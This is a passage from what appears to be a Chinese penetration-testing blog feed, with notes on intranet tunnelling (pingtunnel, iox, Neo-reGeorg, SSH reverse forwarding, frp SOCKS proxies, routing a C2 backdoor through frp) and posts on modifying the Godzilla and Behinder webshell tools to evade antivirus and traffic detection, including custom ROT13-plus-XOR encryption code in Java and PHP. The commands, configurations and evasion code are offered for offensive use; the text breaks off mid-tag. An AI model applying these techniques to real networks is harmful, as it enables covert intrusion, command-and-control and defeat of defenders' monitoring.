src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-12%20224708.png"></p><p>随便一台电脑上ping绑定的域名 ，若能ping通，且显示的IP地址是我们配置的VPS的地址，说明第一条A类解析设置成功并已生效。</p><p>CS:<br>官网的用法：<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-12%20225210.png"><br>写入NS的记录</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">checkin</span><br><span class="line"><span class="built_in">mode</span> dns-txt</span><br></pre></td></tr></table></figure><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>SMB一般在防火墙入站默认开启的，判断目标端口是否开放<br>使用场景：防火墙放行的入口打不下利用放行的SMB移动获取权限<br>利用条件：密码喷射或已知口令的情况下直接正向SMB横向移动拿下</p><h2 id="端口转发穿透内网"><a href="#端口转发穿透内网" class="headerlink" title="端口转发穿透内网"></a>端口转发穿透内网</h2><p><a href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a><br><a href="https://github.com/EddieIvan01/iox">https://github.com/EddieIvan01/iox</a><br>1,Pingtunnel配合iox代理Socks内网穿透（防火墙只让ICMP出）<br>2,dnscat2（DNS）配合上线（防火墙只让DNS出）<br><strong>注意：在实战中碰到此情况，说明此电脑的用处不大基本那些weshell就到此结束了。</strong><br>C2:<br>接收客户端传递的ICMP</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./pingtunnel -type server -noprint 1 -nolog 1 -key 0000000</span><br></pre></td></tr></table></figure><p>将本地4433转到5566端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./iox proxy -l 4455 -l 5566</span><br></pre></td></tr></table></figure><p>Web<br>将本地2222的TCP封装ICMP给193.168.139.141:4455</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pingtunnel -type client l 127.0.0.1 -s 192.168.139.141 -t 193.168.139.141:4455 -tcp 1 -noprint 1 -nolog 1 -key 000000</span><br></pre></td></tr></table></figure><p>建立Socks节点绑定3389端口：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iox.exe proxy -r 127.0.0.1:2222</span><br></pre></td></tr></table></figure><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p><a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a><br>设置密码生成隧道。(aspx|ashx|jsp|jspx|php)并上传到WEB服务器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python neoreg.py generate -k password</span><br></pre></td></tr></table></figure><p>使用neoreg.py连接WEB服务器，在本地建立socks5代理</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">python3 neoreg.py -k password -u http://xx/tunnel.php</span></span><br><span class="line"><span class="section">+------------------------------------------------------------------------+</span></span><br><span class="line"><span class="code">  Log Level set to [DEBUG]</span></span><br><span class="line"><span class="code">  Starting socks server [127.0.0.1:1080]</span></span><br><span class="line"><span class="code">  Tunnel at:</span></span><br><span class="line"><span class="section">    http://xx/tunnel.php</span></span><br><span class="line"><span class="section">+------------------------------------------------------------------------+</span></span><br></pre></td></tr></table></figure><p>其他工具：<br>哥斯拉，冰蝎<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-13%20155446.png"></p><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p>使用场景：内网主机防火墙限制了出网协议，可以利用SSH转发流量实现内网穿透<br>条件:<br>被控主机需要支持SSH协议(Windwos需要安装支持软件)<br>将2.22主机上80端口流量转发到xx.xx上的1234端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -cfNg -R 1234:192.168.2.22:80 root@xx.xx.xx.xx</span><br><span class="line">curl http://127.0.0.1:1234</span><br></pre></td></tr></table></figure><h2 id="frp穿透"><a href="#frp穿透" class="headerlink" title="frp穿透"></a>frp穿透</h2><p><a href="https://github.com/fatedier/frp/releases/tag/v0.62.1">https://github.com/fatedier/frp/releases/tag/v0.62.1</a><br>在公网主机上修改frps.toml，设置bindPortfrp客户端的连接：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># frps.toml</span></span><br><span class="line"><span class="attr">bindPort</span> = <span class="number">7000</span></span><br></pre></td></tr></table></figure><p>启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.toml</span><br></pre></td></tr></table></figure><p>尝试将远程服务器的6666 转到 127.0.0.1 5555 采用tcp协议<br>攻击机frpc.toml修改，将serverAddr字段设置为的frps服务器的公网IP地址：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># frpc.toml</span></span><br><span class="line"><span class="attr">serverAddr</span> = <span class="string">&quot;x.x.x.x&quot;</span></span><br><span class="line"><span class="attr">serverPort</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[[proxies]]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;test-tcp&quot;</span></span><br><span class="line"><span class="attr">type</span> = <span class="string">&quot;tcp&quot;</span></span><br><span class="line"><span class="attr">localIP</span> = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="attr">localPort</span> = <span class="number">5555</span></span><br><span class="line"><span class="attr">remotePort</span> = <span class="number">6000</span></span><br></pre></td></tr></table></figure><p>启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c ./frpc.toml</span><br></pre></td></tr></table></figure><p>如何利用这种情况实现c2上线<br>监听器1：47.23.291.34 6666端口<br>监听器2：192.168.139.141 5555端口<br>生成后门用监听器1<br>后门-&gt;47.23.291.34:6666-&gt;frp 192.168.139.141:5555-&gt;监听器2-&gt;正常上线</p><p>信息收集：<br>1，建立socks节点做信息收集<br>对方内网主机frpc.ini配置：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = xx.xx.xx.xx  公网服务器IP地址</span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">tls_enable</span> = <span class="literal">true</span> </span><br><span class="line"><span class="attr">pool_count</span> = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="section">[plugin_socks]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">6000</span>  <span class="comment">#将远程服务端的6000端口成为socks代理</span></span><br><span class="line"><span class="attr">plugin</span> = socks5</span><br><span class="line"><span class="attr">plugin_user</span> = admin</span><br><span class="line"><span class="attr">plugin_passwd</span> = admin@<span class="number">123</span></span><br><span class="line"><span class="attr">use_encryption</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">use_compression</span> = ture</span><br></pre></td></tr></table></figure><p>公网服务端frps.ini配置</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="comment"># login</span></span><br><span class="line"><span class="attr">dashboard_port</span> = <span class="number">7500</span>           <span class="comment">#web面板</span></span><br><span class="line"><span class="attr">dashboard_user</span> = admin</span><br><span class="line"><span class="attr">dashboard_pwd</span> = admin@<span class="number">123</span></span><br><span class="line"><span class="attr">log_frp</span> = /var/log/frps.log</span><br><span class="line"><span class="attr">log_level</span> = info </span><br><span class="line"><span class="attr">log_max_days</span> = <span class="number">3</span></span><br><span class="line"><span class="attr">authentication_timeout</span> = <span class="number">0</span></span><br><span class="line"><span class="attr">max_pool_count</span> = <span class="number">50</span></span><br></pre></td></tr></table></figure><p>本地在使用proxifier配置公网的ip为socks代理，端口为6000<br>实战场景：拿到webshell但是上线不了cs（出入站的阻止），要对主机的内部网络进行信息收集打点，无法采用cs上面的socks节点去操作  上传至控制机器 frpc 创建socks节点<br>条件：出站没有限制</p><p>2，端口映射转发做信息收集<br>条件：入站没有限制<br>尝试将远程服务端的8888转发映射到192.168.2.22 80<br>被控制机frpc.ini配置：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">serverAddr</span> = <span class="string">&quot;xx.xx.xx.xx&quot;</span>  <span class="comment">#公网服务器</span></span><br><span class="line"><span class="attr">serverPort</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[[proxies]]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;test-tcp&quot;</span></span><br><span class="line"><span class="attr">type</span> = <span class="string">&quot;tcp&quot;</span></span><br><span class="line"><span class="attr">localIP</span> = <span class="string">&quot;192.168.2.22&quot;</span></span><br><span class="line"><span class="attr">localPort</span> = <span class="number">80</span></span><br><span class="line"><span class="attr">remotePort</span> = <span class="number">8888</span></span><br></pre></td></tr></table></figure><h2 id="NPS穿透"><a href="#NPS穿透" class="headerlink" title="NPS穿透"></a>NPS穿透</h2><p>一款轻量级、高性能、功能强大的内网穿透代理服务器。支持tcp、udp、socks5、http等几乎所有流量转发，可用来访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析、内网socks5代理等等……，并带有功能强大的web管理端。<br><a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>魔改哥斯拉</title>
      <link href="/2025/06/17/%E9%AD%94%E6%94%B9%E5%93%A5%E6%96%AF%E6%8B%89/"/>
      <url>/2025/06/17/%E9%AD%94%E6%94%B9%E5%93%A5%E6%96%AF%E6%8B%89/</url>
      
        <content type="html"><![CDATA[<h1 id="免杀对抗-2"><a href="#免杀对抗-2" class="headerlink" title="免杀对抗-2"></a>免杀对抗-2</h1><h2 id="魔改哥斯拉"><a href="#魔改哥斯拉" class="headerlink" title="魔改哥斯拉"></a>魔改哥斯拉</h2><p>流量特征修改：<br>1，抓包分析特征流量<br>2，特征对应的代码段<br>3，修改代码段打扰魔改</p><p>官网下载jar文件：<br><a href="https://github.com/BeichenDream/Godzilla/releases/tag/v4.0.1-godzilla">https://github.com/BeichenDream/Godzilla/releases/tag/v4.0.1-godzilla</a><br>反编译jar：<br><a href="https://www.decompiler.com/">https://www.decompiler.com/</a><br>idea自带的反编译工具</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java <span class="operator">-</span>cp <span class="string">&quot;D:<span class="char escape_">\P</span>rogram Files<span class="char escape_">\J</span>etBrains<span class="char escape_">\I</span>ntelliJ IDEA 2025.1.1.1<span class="char escape_">\p</span>lugins<span class="char escape_">\j</span>ava-decompiler<span class="char escape_">\l</span>ib<span class="char escape_">\j</span>ava-decompiler.jar&quot;</span> org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler <span class="operator">-</span>dgs<span class="operator">=</span><span class="literal">true</span> Godzilla.jar godzilla_src</span><br></pre></td></tr></table></figure><p>打开idea新建项目，并将反编译的文件放入项目中<br>创建lib文件（放入Godzilla.jar）<br>在项目结构中导入模块和工作件<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-08%20182524.png"><br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-08%20182959.png"><br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-08%20183040.png"></p><p>更改文件后重新构建后运行后报错：<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-08%20183353.png"><br>所以需要更改一下其他地方<br>搜索报错内容的关键字<br>查到此文件：<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-08%20185450.png"><br>将校验内容注释：<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-08%20190115.png"><br>重新构建，将报错的文件直接删掉就行。</p><h3 id="更改强特征："><a href="#更改强特征：" class="headerlink" title="更改强特征："></a>更改强特征：</h3><p>1，分析数据包<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-08%20190950.png"><br>User-Agent,Accept,Accpet-Language，Post内容，为强特征，需要更改内容<br>更改内容处：<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-08%20191406.png"><br>下面还有更新函数：<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-08%20192457.png"><br>强制将跟新的内容换成我们更改的</p><h3 id="Webshell生成"><a href="#Webshell生成" class="headerlink" title="Webshell生成"></a>Webshell生成</h3><p>生成shell的代码处：<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-08%20193314.png"><br>在此处为源代码<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-09%20012142.png"><br>打开工具生成一个shell.php,并将代码使用XG_拟态工具进行免杀加密<br>在将.bin文件的代码替换后，重新构建生成即可</p>]]></content>
      
      
      <categories>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>魔改冰蝎</title>
      <link href="/2025/06/17/%E9%AD%94%E6%94%B9%E5%86%B0%E8%9D%8E/"/>
      <url>/2025/06/17/%E9%AD%94%E6%94%B9%E5%86%B0%E8%9D%8E/</url>
      
        <content type="html"><![CDATA[<h1 id="免杀对抗-1"><a href="#免杀对抗-1" class="headerlink" title="免杀对抗-1"></a>免杀对抗-1</h1><h2 id="Webshell免杀"><a href="#Webshell免杀" class="headerlink" title="Webshell免杀"></a>Webshell免杀</h2><p><a href="http://bypass.tidesec.com/">http://bypass.tidesec.com/</a><br><strong>原理：</strong><br>1，webshell工具里面的后门代码不被病毒检测到-混淆<br>2，webshell工具里面的功能操作不被杀毒拦截到-魔改<br>3，webshell工具里面的操作连接不被平台捕获到-魔改</p><p>通过对冰蝎的数据包分析：<br>1，请求数据包的两个强特征<br>2，已知数据的提交内容加密算法<br>流量平台设备可以分析数据包的两个强特征<br>提交数据进行默认算法解密去分析是否为冰蝎工具连接<br>数据包特征：<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-07%20183226.png"><br>application&#x2F;json, text&#x2F;javascript, <em>&#x2F;</em>; q&#x3D;0.01</p><p>解决1：绕过识别（魔改打乱特征，新增加密算法）<br>解决2：绕过查杀（魔改打乱特征，新增加密算法）</p><h3 id="魔改冰蝎"><a href="#魔改冰蝎" class="headerlink" title="魔改冰蝎"></a>魔改冰蝎</h3><p>JAR反编译打包架构<br>1，反编译Jar<br><a href="https://www.decompiler.com/">https://www.decompiler.com/</a><br>在idea中新建一个项目<br>创建lib目录<br>将Behinder文件原有的内容放入进去<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-07%20211335.png"><br>并将反编译的文件也放入到文件中<br>在项目结构中加入<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-07%20211639.png"><br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-07%20211723.png"><br>在文件中查找特征<br>application&#x2F;json, text&#x2F;javascript, &#x2F;; q&#x3D;0.01<br>Accept-Language:zh-CN,zh; q&#x3D;0.9,en-US;q&#x3D;0.8,en;g&#x3D;0.7<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-07%20184131.png"><br>更改加密特征<br>查看加密算法,随意选择一个加密算法，复制其中的代码段，到文件中去查找位置<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-07%20210645.png"><br>路径：\net\rebeyond\behinder\resource\transprotocol<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-07%20210312.png"><br>只需要将需要更改的内容放入到src目录中<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-07%20212027.png"></p><p>加密：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[] Encrypt(<span class="type">byte</span>[] data) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> <span class="string">&quot;e45e329feb5d925b&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 添加ROT13加密</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; data.length; i++) &#123;</span><br><span class="line">        <span class="type">byte</span> <span class="variable">b</span> <span class="operator">=</span> data[i];</span><br><span class="line">        <span class="keyword">if</span> (b &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; b &lt;= <span class="string">&#x27;z&#x27;</span>) &#123;  <span class="comment">// 处理小写字母</span></span><br><span class="line">            b = (<span class="type">byte</span>) ((b - <span class="string">&#x27;a&#x27;</span> + <span class="number">13</span>) % <span class="number">26</span> + <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; b &lt;= <span class="string">&#x27;Z&#x27;</span>) &#123;  <span class="comment">// 处理大写字母</span></span><br><span class="line">            b = (<span class="type">byte</span>) ((b - <span class="string">&#x27;A&#x27;</span> + <span class="number">13</span>) % <span class="number">26</span> + <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        data[i] = b;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 原有异或加密</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; data.length; i++) &#123;</span><br><span class="line">        data[i] = (<span class="type">byte</span>) (data[i] ^ key.getBytes()[i + <span class="number">1</span> &amp; <span class="number">15</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解密：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[] Decrypt(<span class="type">byte</span>[] data) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> <span class="string">&quot;e45e329feb5d925b&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 第一步：逆向异或操作（与加密相同）</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; data.length; i++) &#123;</span><br><span class="line">        data[i] = (<span class="type">byte</span>) (data[i] ^ key.getBytes()[i + <span class="number">1</span> &amp; <span class="number">15</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 第二步：逆向ROT13操作（与加密相同）</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; data.length; i++) &#123;</span><br><span class="line">        <span class="type">byte</span> <span class="variable">b</span> <span class="operator">=</span> data[i];</span><br><span class="line">        <span class="keyword">if</span> (b &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; b &lt;= <span class="string">&#x27;z&#x27;</span>) &#123;  <span class="comment">// 处理小写字母</span></span><br><span class="line">            b = (<span class="type">byte</span>) ((b - <span class="string">&#x27;a&#x27;</span> + <span class="number">13</span>) % <span class="number">26</span> + <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; b &lt;= <span class="string">&#x27;Z&#x27;</span>) &#123;  <span class="comment">// 处理大写字母</span></span><br><span class="line">            b = (<span class="type">byte</span>) ((b - <span class="string">&#x27;A&#x27;</span> + <span class="number">13</span>) % <span class="number">26</span> + <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        data[i] = b;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可用ai將原有的加密方式添加或重新生成新的加密算法<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-07%20210452.png"><br>提示保存成功表示代码没有问题<br>点击分享保存<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-07%20210855.png"><br>将保存的文件放入文件加密解密目录下\net\rebeyond\behinder\resource\transprotocol<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-07%20212509.png"><br>生成的是jsp的文件，如果要使用php的<br>还是使用ai<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-07%20214403.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&quot;e45e329feb5d925b&quot;</span>;</span><br><span class="line">    <span class="variable">$keyBytes</span> = <span class="title function_ invoke__">array_values</span>(<span class="title function_ invoke__">unpack</span>(<span class="string">&#x27;C*&#x27;</span>, <span class="variable">$key</span>)); <span class="comment">// 将密钥转为字节数组</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 执行ROT13加密</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$byte</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$byte</span> &gt;= <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;a&#x27;</span>) &amp;&amp; <span class="variable">$byte</span> &lt;= <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;z&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$byte</span> = ((<span class="variable">$byte</span> - <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;a&#x27;</span>) + <span class="number">13</span>) % <span class="number">26</span>) + <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="variable">$byte</span> &gt;= <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;A&#x27;</span>) &amp;&amp; <span class="variable">$byte</span> &lt;= <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;Z&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$byte</span> = ((<span class="variable">$byte</span> - <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;A&#x27;</span>) + <span class="number">13</span>) % <span class="number">26</span>) + <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$data</span>[<span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="variable">$byte</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 执行异或加密</span></span><br><span class="line">    <span class="variable">$encrypted</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$keyIndex</span> = (<span class="variable">$i</span> + <span class="number">1</span>) &amp; <span class="number">15</span>; <span class="comment">// 等同于 (i+1) % 16</span></span><br><span class="line">        <span class="variable">$encryptedByte</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]) ^ <span class="variable">$keyBytes</span>[<span class="variable">$keyIndex</span>];</span><br><span class="line">        <span class="variable">$encrypted</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$encryptedByte</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$encrypted</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span 